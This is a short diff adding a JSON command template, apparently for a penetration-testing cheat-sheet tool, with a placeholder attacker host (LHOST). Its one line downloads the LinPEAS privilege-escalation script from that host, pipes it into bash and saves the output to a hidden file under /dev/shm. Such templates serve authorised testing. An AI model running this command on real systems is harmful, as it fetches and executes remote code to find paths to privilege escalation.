@@ -1,0 +1,6 @@
+{
+	"line": "curl http://LHOST/linpeas.sh | bash | tee /dev/shm/.lp.txt",
+	"variables": {
+        "LHOST": "LHOST"
+	}
+}
